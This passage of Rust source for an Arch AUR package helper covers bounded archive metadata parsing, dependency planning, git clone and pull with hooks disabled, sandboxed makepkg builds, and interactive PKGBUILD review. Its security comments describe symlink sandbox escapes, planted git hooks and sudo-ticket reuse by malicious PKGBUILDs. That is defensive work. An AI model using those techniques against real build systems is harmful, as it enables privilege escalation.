        let mut tar_archive = tar::Archive::new(reader);
        let mut pkginfo: Option<String> = None;
        let mut install_script: Option<String> = None;
        for entry in tar_archive.entries()? {
            let entry = entry?;
            let entry_path = entry.path()?;
            if entry_path.components().count() > 2 {
                continue;
            }
            match entry_path.file_name().and_then(|name| name.to_str()) {
                Some(".PKGINFO" | "PKGINFO") if pkginfo.is_none() => {
                    pkginfo = Some(Self::read_bounded_archive_member(entry)?);
                }
                Some(".INSTALL") if install_script.is_none() => {
                    install_script = Some(Self::read_bounded_archive_member(entry)?);
                }
                _ => {}
            }
        }
        let Some(pkginfo) = pkginfo else {
            return Ok(None);
        };
        Ok(
            Self::parse_pkginfo_identity(&pkginfo).map(|(name, version, base)| {
                CachedArchiveIdentity {
                    name,
                    version,
                    base,
                    install_script,
                }
            }),
        )
    }

    /// Read one archive member with the same size cap as `.PKGINFO` reads.
    fn read_bounded_archive_member<R: std::io::Read>(entry: tar::Entry<R>) -> Result<String> {
        if entry.size() > MAX_PKGINFO_BYTES {
            anyhow::bail!("Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit");
        }
        let mut content = String::with_capacity(entry.size() as usize);
        entry
            .take(MAX_PKGINFO_BYTES + 1)
            .read_to_string(&mut content)?;
        if content.len() as u64 > MAX_PKGINFO_BYTES {
            anyhow::bail!("Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit");
        }
        Ok(content)
    }

    /// Extract `(pkgname, full-version, pkgbase)` from `.PKGINFO` content.
    /// `pkgbase` is mandatory for provenance: makepkg always emits it, so an
    /// archive without one is not a makepkg product and must not be trusted.
    fn parse_pkginfo_identity(content: &str) -> Option<(String, String, String)> {
        let mut name: Option<String> = None;
        let mut version: Option<String> = None;
        let mut base: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            match key.trim() {
                "pkgname" if name.is_none() => name = Some(value.trim().to_string()),
                "pkgver" if version.is_none() => version = Some(value.trim().to_string()),
                "pkgbase" if base.is_none() => base = Some(value.trim().to_string()),
                _ => {}
            }
        }
        Some((name?, version?, base?))
    }

    /// Extract the `pkgbase` value from `.SRCINFO` text (first occurrence).
    fn srcinfo_pkgbase(content: &str) -> Option<&str> {
        content.lines().find_map(|line| {
            let (key, value) = line.split_once('=')?;
            let value = value.trim();
            (key.trim() == "pkgbase" && !value.is_empty()).then_some(value)
        })
    }

    /// Extract the install script declared for one split-package output in
    /// `.SRCINFO` text. The `install =` key appears inside the block of the
    /// `pkgname =` it belongs to; returns `None` when that output declares
    /// no install script.
    fn srcinfo_install_script(content: &str, pkgname: &str) -> Option<String> {
        let mut current_block_is_target = false;
        let mut install: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            let value = value.trim();
            match key.trim() {
                "pkgname" => {
                    if install.is_some() {
                        break; // Found in the target block; later blocks are sibling outputs.
                    }
                    current_block_is_target = value == pkgname;
                }
                "install" if current_block_is_target && install.is_none() && !value.is_empty() => {
                    install = Some(value.to_string());
                }
                _ => {}
            }
        }
        install
    }

    pub(crate) fn pkg_name_and_version_from_archive(path: &Path) -> Option<(String, String)> {
        Self::pkg_name_and_version_from_archive_result(path)
            .ok()
            .flatten()
    }

    fn package_archive_reader(path: &Path, budget: u64) -> Result<Box<dyn Read>> {
        let file = File::open(path)?;
        if path.extension().is_some_and(|ext| ext == "zst") {
            let decoder = ruzstd::decoding::StreamingDecoder::new(file)
                .map_err(|error| anyhow::anyhow!("zstd: {error}"))?;
            Ok(Box::new(BudgetedReader::new(decoder, budget)))
        } else if path.extension().is_some_and(|ext| ext == "xz") {
            let temporary = tempfile::NamedTempFile::new()
                .context("Failed to create temporary AUR package metadata spool")?;
            let mut output = BudgetedWriter::new(temporary, budget);
            lzma_rs::xz_decompress(&mut BufReader::new(file), &mut output)
                .map_err(|error| anyhow::anyhow!("xz: {error}"))?;
            let mut output = output.into_inner().into_file();
            output.rewind()?;
            Ok(Box::new(output))
        } else {
            Ok(Box::new(BudgetedReader::new(
                flate2::read::GzDecoder::new(file),
                budget,
            )))
        }
    }

    fn pkg_name_and_version_from_archive_result(path: &Path) -> Result<Option<(String, String)>> {
        let reader = Self::package_archive_reader(path, MAX_DECOMPRESSED_BYTES)?;
        let mut archive = tar::Archive::new(reader);
        for entry in archive.entries()? {
            let entry = entry?;
            let entry_path = entry.path()?;
            if entry_path.components().count() <= 2
                && let Some(file_name) = entry_path.file_name().and_then(|name| name.to_str())
                && matches!(file_name, ".PKGINFO" | "PKGINFO")
            {
                if entry.size() > MAX_PKGINFO_BYTES {
                    anyhow::bail!(
                        "Package metadata in {} exceeds the {} byte limit",
                        path.display(),
                        MAX_PKGINFO_BYTES
                    );
                }
                let mut content = String::with_capacity(entry.size() as usize);
                entry
                    .take(MAX_PKGINFO_BYTES + 1)
                    .read_to_string(&mut content)?;
                if content.len() as u64 > MAX_PKGINFO_BYTES {
                    anyhow::bail!(
                        "Package metadata in {} exceeds the {} byte limit",
                        path.display(),
                        MAX_PKGINFO_BYTES
                    );
                }
                return Ok(Self::parse_pkginfo_name_version(&content));
            }
        }
        Ok(None)
    }

    async fn aur_dependency_plan(
        &self,
        pkg_dir: &Path,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<AurDependencyPlan> {
        anyhow::ensure!(
            pkg_dir.join(".SRCINFO").is_file(),
            "AUR package '{package}' has no regular .SRCINFO; refusing to source its PKGBUILD to discover dependencies"
        );
        let dependency_dir = pkg_dir.to_path_buf();
        let requested_outputs = requested_outputs.to_vec();
        let dep_info = tokio::task::spawn_blocking(move || {
            check_dependencies_for_outputs(&dependency_dir, &requested_outputs)
        })
        .await
        .context("AUR dependency inspection task failed")?
        .with_context(|| format!("Failed to inspect dependencies for '{package}'"))?;

        let package_outputs = dep_info.package_outputs;
        let missing_dependencies = dep_info.missing;
        let classified = tokio::task::spawn_blocking(move || {
            crate::package_managers::alpm_direct::with_handle(|alpm| {
                Ok(missing_dependencies
                    .into_iter()
                    .map(|dependency| {
                        let official_package = alpm
                            .syncdbs()
                            .find_satisfier(dependency.clone())
                            .map(|package| package.name().to_string());
                        (dependency, official_package)
                    })
                    .collect::<Vec<_>>())
            })
        })
        .await
        .context("Official dependency classification task failed")??;

        let mut aur_dependencies = Vec::new();
        let mut official_dependencies = Vec::new();
        let mut unresolved = Vec::new();
        for (dependency, official_package) in classified {
            let name = dependency_name(&dependency);
            if name.is_empty() || name == package {
                continue;
            }

            if let Some(official_package) = official_package {
                official_dependencies.push(official_package);
            } else if self.info(name).await?.is_some() {
                aur_dependencies.push(name.to_string());
            } else {
                unresolved.push(dependency);
            }
        }

        anyhow::ensure!(
            unresolved.is_empty(),
            "Unresolvable dependencies for '{package}': {}",
            unresolved.join(", ")
        );
        aur_dependencies.sort();
        aur_dependencies.dedup();
        official_dependencies.sort();
        official_dependencies.dedup();
        Ok(AurDependencyPlan {
            aur_dependencies,
            official_dependencies,
            package_outputs,
        })
    }

    async fn install_official_dependencies(packages: &[String]) -> Result<()> {
        if packages.is_empty() {
            return Ok(());
        }

        let _install_guard = INSTALL_LOCK.lock().await;
        crate::cli::modern_ui::print_info(&format!(
            "Installing official build dependencies: {}",
            packages.join(", ")
        ));
        use crate::package_managers::traits::PackageManager;
        crate::package_managers::ArchPackageManager::new()
            .install(packages)
            .await
            .context("Failed to install official AUR build dependencies")
    }

    async fn ensure_dependencies_satisfied(
        pkg_dir: &Path,
        package_outputs: &[String],
    ) -> Result<()> {
        let pkg_dir = pkg_dir.to_path_buf();
        let package_outputs = package_outputs.to_vec();
        tokio::task::spawn_blocking(move || {
            let remaining = check_dependencies_for_outputs(&pkg_dir, &package_outputs)
                .context("Failed to verify AUR build dependencies")?
                .missing;
            anyhow::ensure!(
                remaining.is_empty(),
                "AUR build dependencies remain unsatisfied after installation: {}",
                remaining.join(", ")
            );
            Ok(())
        })
        .await
        .context("AUR dependency verification task failed")?
    }

    async fn git_clone(&self, package: &str) -> Result<()> {
        let url = format!("{AUR_GIT_URL}/{package}.git");
        let safe_url = crate::core::http::redact_url(&url);
        let dest = self.build_dir.join(package);

        let spinner = create_spinner("Cloning repository...");

        if let Some(user) = original_user() {
            let home = original_user_home()?;
            let dest_str = dest.to_string_lossy();

            let mut cmd = Command::new("sudo");
            cmd.args(["-u", &user]);

            if let Some(ref home_path) = home {
                cmd.arg("-H");
                cmd.env("HOME", home_path);
            }

            cmd.args([
                "git",
                "clone",
                "--depth=1",
                "--filter=blob:none", // Partial clone: download only needed blobs on demand
                "--",
                &url,
                dest_str.as_ref(),
            ]);

            // Prevent git from prompting for credentials
            cmd.env("GIT_TERMINAL_PROMPT", "0");
            configure_auxiliary_output(&mut cmd);

            let status = cmd
                .stdin(std::process::Stdio::null())
                .status()
                .await
                .with_context(|| format!("Failed to run git clone as user '{user}'"))?;

            if !status.success() {
                anyhow::bail!("git clone failed for {safe_url}");
            }

            spinner.finish_and_clear();
        } else {
            let mut command = Command::new("git");
            command
                .args(["clone", "--depth=1", "--filter=blob:none", "--"])
                .arg(&url)
                .arg(&dest)
                .env("GIT_TERMINAL_PROMPT", "0")
                .stdin(std::process::Stdio::null());
            configure_auxiliary_output(&mut command);
            let status = command
                .status()
                .await
                .with_context(|| format!("Failed to run git clone for {safe_url}"))?;
            spinner.finish_and_clear();
            if !status.success() {
                anyhow::bail!("git clone failed for {safe_url}");
            }
        }
        Ok(())
    }

    async fn git_pull(&self, pkg_dir: &Path) -> Result<()> {
        if !crate::core::is_root() && is_root_owned(pkg_dir) {
            // Prefer a pwd lookup over the `USER` env var, which the
            // invoking environment can set to anything.
            let current_user = whoami::username().unwrap_or_default();
            let current_user = if current_user.is_empty() {
                std::env::var("USER").unwrap_or_else(|_| "nobody".to_string())
            } else {
                current_user
            };
            let fix_spinner = create_spinner("Fixing directory ownership...");
            let fix_result = Command::new("sudo")
                .args(["chown", "-R", &format!("{current_user}:{current_user}")])
                .arg(pkg_dir)
                .status()
                .await;

            match fix_result {
                Ok(status) if status.success() => {
                    fix_spinner.finish_and_clear();
                    tracing::info!("Fixed ownership of {}", pkg_dir.display());
                }
                _ => {
                    fix_spinner.finish_and_clear();
                    anyhow::bail!(
                        "Build directory '{}' is owned by root.\n  \
                         → This was likely created by a previous 'sudo omg install'.\n  \
                         → Fix: sudo chown -R $USER:$USER ~/.cache/omg/aur/\n  \
                         → Or clean and reinstall: rm -rf ~/.cache/omg/aur/{} && omg install {}",
                        pkg_dir.display(),
                        pkg_dir
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("package"),
                        pkg_dir
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("package")
                    );
                }
            }
        }

        let spinner = create_spinner("Pulling latest changes...");

        if let Some(user) = original_user() {
            let home = original_user_home()?;
            let pkg_dir_str = pkg_dir.to_string_lossy();

            let mut cmd = Command::new("sudo");
            cmd.args(["-u", &user]);

            if let Some(ref home_path) = home {
                cmd.arg("-H");
                cmd.env("HOME", home_path);
            }

            // The checkout was writable to untrusted build code (wave-12
            // aud-aur-client): a planted .git/hooks/post-merge or
            // core.hooksPath would execute as the real user on this pull.
            // Hooks are disabled outright and global/system config is
            // isolated so repository-local config cannot inject behavior.
            cmd.args(["git", "-C", pkg_dir_str.as_ref()]);
            cmd.args(AUR_GIT_PULL_ARGS);
            cmd.env("GIT_TERMINAL_PROMPT", "0");
            cmd.env("GIT_CONFIG_NOSYSTEM", "1");
            configure_auxiliary_output(&mut cmd);

            let status = cmd
                .stdin(std::process::Stdio::null())
                .status()
                .await
                .with_context(|| format!("Failed to run git pull as user '{user}'"))?;

            spinner.finish_and_clear();

            if !status.success() {
                anyhow::bail!(
                    "git pull failed in {}\n  → Try: rm -rf ~/.cache/omg/aur/{} && omg install {}",
                    pkg_dir.display(),
                    pkg_dir
                        .file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("package"),
                    pkg_dir
                        .file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("package")
                );
            }
        } else {
            let mut command = Command::new("git");
            command
                .arg("-C")
                .arg(pkg_dir)
                .args(AUR_GIT_PULL_ARGS)
                .env("GIT_TERMINAL_PROMPT", "0")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .stdin(std::process::Stdio::null());
            configure_auxiliary_output(&mut command);
            let status = command
                .status()
                .await
                .with_context(|| format!("Failed to run git pull in {}", pkg_dir.display()))?;
            spinner.finish_and_clear();
            if !status.success() {
                anyhow::bail!(
                    "git pull failed in {}\n  → Try removing the cached AUR checkout and reinstalling",
                    pkg_dir.display()
                );
            }
        }
        Ok(())
    }

    async fn run_build(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        match self.settings.aur.build_method {
            AurBuildMethod::Bubblewrap => self.run_sandboxed_makepkg(pkg_dir, env, package).await,
            AurBuildMethod::Chroot => self.run_chroot_build(pkg_dir, env, package).await,
            AurBuildMethod::Native => {
                if !self.settings.aur.allow_unsafe_builds {
                    anyhow::bail!(
                        "Native AUR builds are disabled. Enable 'aur.allow_unsafe_builds' or use bubblewrap/chroot."
                    );
                }
                self.run_native_makepkg(pkg_dir, env, package).await
            }
        }
    }

    /// Run makepkg with bubblewrap sandboxing if available
    /// Falls back to regular makepkg if bwrap is not installed and unsafe builds are allowed
    async fn run_sandboxed_makepkg(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let bwrap_available = which("bwrap").is_ok();

        if bwrap_available {
            tracing::info!("Using bubblewrap sandbox for secure AUR build");

            // Repository dependencies were installed before entering the
            // sandbox; the untrusted build itself receives no sudo-capable TTY.

            // - Read-only bind: /usr, /etc, /lib, /lib64
            // - Writable: Build directory, /tmp
            // - Minimal device access

            // Security: Canonicalize all writable paths to prevent symlink-based sandbox escapes
            // An attacker could create symlink: ~/.cache/omg/aur/evil -> /etc
            // Without this check, we'd bind /etc as writable inside the sandbox
            use super::utils::validate_path_inside;

            // Validate pkg_dir isn't a symlink and is inside build_dir.
            // Fails closed: an uninspectable path is rejected, not trusted.
            if is_symlink(pkg_dir)
                .context("Security: Cannot inspect package directory (potential sandbox escape)")?
            {
                anyhow::bail!(
                    "Security: Package directory is a symlink (potential sandbox escape): {}",
                    pkg_dir.display()
                );
            }
            validate_path_inside(&self.build_dir, pkg_dir)?;

            // Canonicalize all writable bind mount paths
            let pkg_dir_canonical = pkg_dir
                .canonicalize()
                .with_context(|| format!("Failed to canonicalize: {}", pkg_dir.display()))?;
            let pkgdest_canonical = env.pkgdest.canonicalize().with_context(|| {
                format!("Failed to canonicalize pkgdest: {}", env.pkgdest.display())
            })?;
            let srcdest_canonical = env.srcdest.canonicalize().with_context(|| {
                format!("Failed to canonicalize srcdest: {}", env.srcdest.display())
            })?;
            let builddir_canonical = env.builddir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize builddir: {}",
                    env.builddir.display()
                )
            })?;

            // Verify all writable paths are inside user's cache directory (not /etc, /root, etc.)
            let cache_base = paths::cache_dir().canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize cache directory: {}",
                    paths::cache_dir().display()
                )
            })?;
            for (name, path) in [
                ("pkgdest", &pkgdest_canonical),
                ("srcdest", &srcdest_canonical),
                ("builddir", &builddir_canonical),
            ] {
                if !path.starts_with(&cache_base) {
                    anyhow::bail!(
                        "Security: {} escapes cache directory!\n  Path: {}\n  Allowed: {}/*",
                        name,
                        path.display(),
                        cache_base.display()
                    );
                }
            }
            let compiler_cache_mounts =
                Self::sandbox_cache_mounts(&cache_base, &env.compiler_cache_dirs)?;
            let pgp_home = env
                .pgp_home
                .as_ref()
                .map(|home| {
                    home.path().canonicalize().with_context(|| {
                        format!(
                            "Failed to canonicalize package-scoped PGP keyring: {}",
                            home.path().display()
                        )
                    })
                })
                .transpose()?;
            if let Some(path) = &pgp_home {
                anyhow::ensure!(
                    path.starts_with(&cache_base),
                    "Security: package-scoped PGP keyring escapes cache directory: {}",
                    path.display()
                );
            }

            let pkg_dir_str = pkg_dir_canonical.to_string_lossy();
            let (build_user_name, home) = build_identity();

            let pkgdest_str = pkgdest_canonical.to_string_lossy();
            let srcdest_str = srcdest_canonical.to_string_lossy();
            let builddir_str = builddir_canonical.to_string_lossy();
            let pacman_db_dir = paths::pacman_db_dir_result()?;
            let pacman_db_dir_str = pacman_db_dir.to_string_lossy();
            let pacman_cache_root = paths::pacman_cache_root_dir_result()?;
            let pacman_cache_root_str = pacman_cache_root.to_string_lossy();
            let home_str = home.to_string_lossy();

            // Keep bwrap as omg's direct child for parent-death handling.
            // Its PID namespace makes cancellation kill compiler descendants
            // too; --die-with-parent alone only kills the direct command.
            // --new-session blocks reuse of tty-scoped sudo credentials.
            let mut cmd = sandbox_command(&home, &build_user_name);
            cmd.args([
                "--ro-bind",
                "/usr",
                "/usr",
                "--ro-bind",
                "/etc",
                "/etc",
                "--ro-bind",
                "/lib",
                "/lib",
                "--ro-bind",
                "/lib64",
                "/lib64",
                "--symlink",
                "/usr/bin",
                "/bin",
                "--symlink",
                "/usr/sbin",
                "/sbin",
                "--tmpfs",
            ]);
            cmd.arg(&*home_str);
            configure_sandbox_resolver(&mut cmd)?;

            cmd.args(["--bind"]);
            cmd.arg(&*pkg_dir_str);
            cmd.arg(&*pkg_dir_str);
            cmd.args(["--bind"]);
            cmd.arg(&*pkgdest_str);
            cmd.arg(&*pkgdest_str);
            cmd.args(["--bind"]);
            cmd.arg(&*srcdest_str);
            cmd.arg(&*srcdest_str);
            cmd.args(["--bind"]);
            cmd.arg(&*builddir_str);
            cmd.arg(&*builddir_str);
            for cache_dir in &compiler_cache_mounts {
                cmd.args(["--bind"]);
                cmd.arg(cache_dir);
                cmd.arg(cache_dir);
            }
            if let Some(path) = &pgp_home {
                cmd.args(["--bind"]);
                cmd.arg(path);
                cmd.arg(path);
            }
            cmd.args([
                "--tmpfs",
                "/tmp",
                "--dev",
                "/dev",
                "--proc",
                "/proc",
                "--ro-bind",
            ]);
            cmd.arg(&*pacman_db_dir_str);
            cmd.arg(&*pacman_db_dir_str);
            cmd.args(["--ro-bind"]);
            cmd.arg(&*pacman_cache_root_str);
            cmd.arg(&*pacman_cache_root_str);
            cmd.arg("--chdir");
            cmd.arg(&*pkg_dir_str);
            for (key, value) in [
                ("HOME", home_str.as_ref()),
                ("XDG_CACHE_HOME", "/tmp/.cache"),
                ("USER", build_user_name.as_str()),
                ("LOGNAME", build_user_name.as_str()),
                ("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin"),
                ("LANG", "C.UTF-8"),
                ("LC_ALL", "C.UTF-8"),
                SANDBOX_FAKEROOT_ENV,
            ] {
                cmd.args(["--setenv", key, value]);
            }
            cmd.args(["--setenv", "MAKEFLAGS"]);
            cmd.arg(&env.makeflags);
            cmd.args(["--setenv", "PKGDEST"]);
            cmd.arg(&*pkgdest_str);
            cmd.args(["--setenv", "SRCDEST"]);
            cmd.arg(&*srcdest_str);
            cmd.args(["--setenv", "BUILDDIR"]);
            cmd.arg(&*builddir_str);
            if let Some(path) = &pgp_home {
                cmd.args(["--setenv", "GNUPGHOME"]);
                cmd.arg(path);
            }

            for (key, value) in &env.extra_env {
                cmd.args(["--setenv", key, value]);
            }

            // Use sandbox-safe args (no -s since deps installed above)
            let makepkg_args = self.makepkg_args_sandbox();
            cmd.args(["--", "makepkg"]);
            cmd.args(makepkg_args);

            cmd.stdin(Stdio::null());
            self.run_logged_build_command(&mut cmd, package)
                .await
                .context("Failed to run sandboxed makepkg")
        } else {
            if !self.settings.aur.allow_unsafe_builds {
                return Err(AurError::SandboxUnavailable.into());
            }

            tracing::debug!("bubblewrap not found, using regular makepkg");
            println!(
                "{} Building without sandbox (install 'bubblewrap' for isolation)...",
                crate::cli::style::dim("→")
            );
            self.run_native_makepkg(pkg_dir, env, package).await
        }
    }

    async fn run_native_makepkg(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let (build_user, build_home) = build_identity();

        // Install and rollback reject root before reaching the build path.
        // Untrusted PKGBUILDs still need an allowlisted environment.
        let mut cmd = Command::new("setsid");
        configure_build_environment(&mut cmd, &build_home, &build_user);
        if let Some(pgp_home) = &env.pgp_home {
            cmd.env("GNUPGHOME", pgp_home.path());
        }
        cmd.args(["-w", "makepkg"]);

        // SECURITY: run makepkg in a NEW SESSION without a controlling TTY.
        // sudo timestamps are tty-scoped by default (timestamp_type=tty), so
        // while omg holds a warm credential in THIS terminal, a malicious
        // PKGBUILD calling `sudo -n ...` inside build()/package() previously
        // inherited that ticket and escalated to root silently. Under setsid
        // there is no controlling terminal, so the attacker's sudo -n fails.
        // -w makes setsid wait and propagate makepkg's real exit status.

        cmd.args(self.makepkg_args())
            .env("MAKEFLAGS", &env.makeflags)
            .env("PKGDEST", &env.pkgdest)
            .env("SRCDEST", &env.srcdest)
            .env("BUILDDIR", &env.builddir);

        for (key, value) in &env.extra_env {
            cmd.env(key, value);
        }

        cmd.current_dir(pkg_dir).stdin(Stdio::null());
        self.run_logged_build_command(&mut cmd, package)
            .await
            .context("Failed to run makepkg")
    }

    async fn run_chroot_build(
        &self,
        pkg_dir: &Path,
        env: &MakepkgEnv,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let mut cmd = if which("pkgctl").is_ok() {
            let mut cmd = Command::new("pkgctl");
            cmd.arg("build");
            if self.settings.aur.secure_makepkg {
                cmd.arg("--clean");
            }
            cmd
        } else if which("makechrootpkg").is_ok() {
            let mut cmd = Command::new("makechrootpkg");
            cmd.args(["-r", "/var/lib/archbuild"]).arg("--");
            cmd
        } else {
            anyhow::bail!(
                "Chroot build requires devtools (pkgctl/makechrootpkg). Install devtools or choose bubblewrap/native."
            );
        };

        let (build_user, build_home) = build_identity();
        configure_build_environment(&mut cmd, &build_home, &build_user);
        if let Some(pgp_home) = &env.pgp_home {
            cmd.env("GNUPGHOME", pgp_home.path());
        }
        cmd.current_dir(pkg_dir)
            .env("MAKEFLAGS", &env.makeflags)
            .env("PKGDEST", &env.pkgdest)
            .env("SRCDEST", &env.srcdest)
            .env("BUILDDIR", &env.builddir)
            .stdin(Stdio::null());
        for (key, value) in &env.extra_env {
            cmd.env(key, value);
        }

        self.run_logged_build_command(&mut cmd, package)
            .await
            .context("Failed to run chroot build")
    }

    fn build_log_path(&self, package: &str) -> PathBuf {
        self.build_dir.join("_logs").join(format!("{package}.log"))
    }

    async fn run_logged_build_command(
        &self,
        command: &mut Command,
        package: &str,
    ) -> Result<std::process::ExitStatus> {
        let log_path = self.build_log_path(package);
        let log_dir = log_path
            .parent()
            .context("AUR build log path must have a parent directory")?;
        tokio::fs::create_dir_all(log_dir).await.with_context(|| {
            format!(
                "Failed to create build log directory: {}",
                log_dir.display()
            )
        })?;
        let log = tokio::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .open(&log_path)
            .await
            .with_context(|| format!("Failed to create build log: {}", log_path.display()))?;
        let log = Arc::new(tokio::sync::Mutex::new(log));

        let progress = crate::cli::modern_ui::aur_build_progress(package, &log_path);
        let verbose =
            crate::cli::modern_ui::output_mode() == crate::cli::modern_ui::OutputMode::Verbose;

        command
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        let mut child = command
            .spawn()
            .with_context(|| format!("Failed to start AUR build for '{package}'"))?;
        let stdout = child
            .stdout
            .take()
            .context("AUR build stdout pipe was not available")?;
        let stderr = child
            .stderr
            .take()
            .context("AUR build stderr pipe was not available")?;

        let stdout_capture = Box::pin(drain_build_output(
            stdout,
            Arc::clone(&log),
            BuildOutputStream::Stdout,
            verbose,
        ));
        let stderr_capture = Box::pin(drain_build_output(
            stderr,
            Arc::clone(&log),
            BuildOutputStream::Stderr,
            verbose,
        ));
        let (status, stdout_result, stderr_result) =
            tokio::join!(child.wait(), stdout_capture, stderr_capture);

        let status = match status {
            Ok(status) => status,
            Err(error) => {
                progress.finish(false);
                return Err(error).context("Failed while waiting for AUR build");
            }
        };
        let capture_result: Result<()> = async {
            stdout_result.context("Failed to capture AUR build stdout")?;
            stderr_result.context("Failed to capture AUR build stderr")?;
            log.lock()
                .await
                .flush()
                .await
                .context("Failed to flush AUR build log")?;
            Ok(())
        }
        .await;

        progress.finish(status.success() && capture_result.is_ok());
        capture_result?;
        Ok(status)
    }

    fn makepkg_args(&self) -> Vec<&'static str> {
        let mut args = vec!["--noconfirm", "-f", "--needed"];
        if self.settings.aur.secure_makepkg {
            args.push("--cleanbuild");
        }
        args
    }

    /// Makepkg args for sandboxed builds (no -s since deps are pre-installed)
    fn makepkg_args_sandbox(&self) -> Vec<&'static str> {
        let mut args = vec!["--noconfirm", "-f"];
        if self.settings.aur.secure_makepkg {
            args.push("--cleanbuild");
        }
        args
    }

    /// Display and confirm a PKGBUILD before any script-driven side effect.
    ///
    /// Returns the SHA-256 hex digest of the reviewed PKGBUILD bytes so the
    /// caller can re-verify the file immediately before building; a mismatch
    /// means the reviewed script and the executed script diverged.
    async fn review_pkgbuild(package: &str, pkgbuild_path: &Path) -> Result<String> {
        // Quiesce before joining the review queue: a queued review should
        // hold one continuous quiesce across the wait and confirm, so
        // concurrent spinners neither flicker nor overwrite review output.
        let _quiesce_guard = crate::cli::modern_ui::quiesce_terminal();
        // Parallel build waves may discover several independent packages at
        // once. One review owns the terminal at a time so prompts and source
        // text cannot interleave.
        let _review_guard = REVIEW_LOCK.lock().await;
        if !console::user_attended() {
            anyhow::bail!(
                "PKGBUILD review requires an interactive terminal. Review the package manually, or explicitly configure aur.review_pkgbuild=false if you accept unreviewed AUR code."
            );
        }

        let bytes = tokio::fs::read(pkgbuild_path)
            .await
            .with_context(|| format!("Failed to read PKGBUILD: {}", pkgbuild_path.display()))?;
        let review = pkgbuild_review_text(&bytes)?;
        let digest = pkgbuild_digest(&bytes);
        println!("{}", pkgbuild_review_panel(package, &digest, &review));

        let prompt = pkgbuild_review_prompt(package);
        let proceed = tokio::task::spawn_blocking(move || {
            Confirm::with_theme(&crate::cli::ui::prompt_theme())
                .with_prompt(prompt)
                .default(false)
                .interact()
        })
        .await
        .context("PKGBUILD review prompt task failed")??;
        if !proceed {
            anyhow::bail!("Build aborted by user after PKGBUILD review.");
        }
        Ok(digest)
    }

    /// Whether AUR builds will demand interactive PKGBUILD review. The
    /// settings field is private; parallel build orchestration needs this to
    /// bail before cloning when no terminal is available for the review.
    pub(crate) fn requires_interactive_review(&self) -> bool {
        self.settings.aur.review_pkgbuild
    }

    #[cfg(feature = "pgp")]
    async fn fetch_missing_pgp_keys(pkgbuild_path: &Path) -> Result<Option<tempfile::TempDir>> {
        use crate::core::security::keyserver;

        let pkgbuild_path = pkgbuild_path.to_path_buf();
        let keyring_state = tokio::task::spawn_blocking(move || {
            let pkgbuild = PkgBuild::parse(&pkgbuild_path).with_context(|| {
                format!(
                    "Failed to parse PKGBUILD at {} for PGP keys",
                    pkgbuild_path.display()
                )
            })?;
            if pkgbuild.validpgpkeys.is_empty() {
                return Ok(None);
            }
            let gnupg_home = std::env::var_os("GNUPGHOME")
                .map(PathBuf::from)
                .or_else(|| dirs::home_dir().map(|home| home.join(".gnupg")))
                .context("Cannot determine home directory for GnuPG keyring")?;
            let mut missing_keys = Vec::with_capacity(pkgbuild.validpgpkeys.len());
            for key_id in &pkgbuild.validpgpkeys {
                require_fetchable_pgp_key_id(key_id)?;
                match keyserver::is_key_in_gnupg(key_id, &gnupg_home) {
                    Ok(true) => {}
                    Ok(false) => missing_keys.push(key_id.clone()),
                    Err(error) => {
                        anyhow::bail!("Failed to read PGP keyring while checking {key_id}: {error}")
                    }
                }
            }
            Ok::<_, anyhow::Error>(Some((pkgbuild.validpgpkeys, missing_keys, gnupg_home)))
        })
        .await
        .context("AUR PGP keyring inspection task failed")??;
        let Some((valid_keys, missing_keys, gnupg_home)) = keyring_state else {
            return Ok(None);
        };

        let fetched_keys = if missing_keys.is_empty() {
            Vec::new()
        } else {
            tracing::info!("Fetching {} missing PGP key(s)...", missing_keys.len());
            keyserver::fetch_keys(&missing_keys)
                .await
                .into_iter()
                .map(|(key_id, result)| match result {
                    Ok(certificate) => Ok((key_id, certificate)),
                    Err(error) => Err(anyhow::anyhow!("Failed to fetch PGP key {key_id}: {error}")),
                })
                .collect::<Result<Vec<_>>>()?
        };
        let cache_dir = paths::cache_dir();

        tokio::task::spawn_blocking(move || {
            for (key_id, certificate) in fetched_keys {
                let info = keyserver::get_key_info(&certificate);
                tracing::debug!("Fetched PGP key: {info}");
                keyserver::import_key_into_gnupg(&certificate, &gnupg_home)
                    .with_context(|| format!("Failed to import key {key_id} into GnuPG"))?;
            }

            create_scoped_pgp_home(&valid_keys, &gnupg_home, &cache_dir).map(Some)
        })
        .await
        .context("AUR PGP key import task failed")?
    }

    #[cfg(not(feature = "pgp"))]
    #[expect(clippy::unused_async)]
    async fn fetch_missing_pgp_keys(_pkgbuild_path: &Path) -> Result<Option<tempfile::TempDir>> {
        tracing::debug!("PGP feature disabled, skipping key fetch");
        Ok(None)
    }

    fn sandbox_cache_mounts(cache_base: &Path, cache_dirs: &[PathBuf]) -> Result<Vec<PathBuf>> {
        let cache_base = cache_base.canonicalize().with_context(|| {
            format!(
                "Failed to canonicalize cache directory: {}",
                cache_base.display()
            )
        })?;
        let mut mounts = Vec::with_capacity(cache_dirs.len());

        for cache_dir in cache_dirs {
            let canonical = cache_dir.canonicalize().with_context(|| {
                format!(
                    "Failed to canonicalize compiler cache directory: {}",
                    cache_dir.display()
                )
            })?;
            anyhow::ensure!(
                canonical.starts_with(&cache_base),
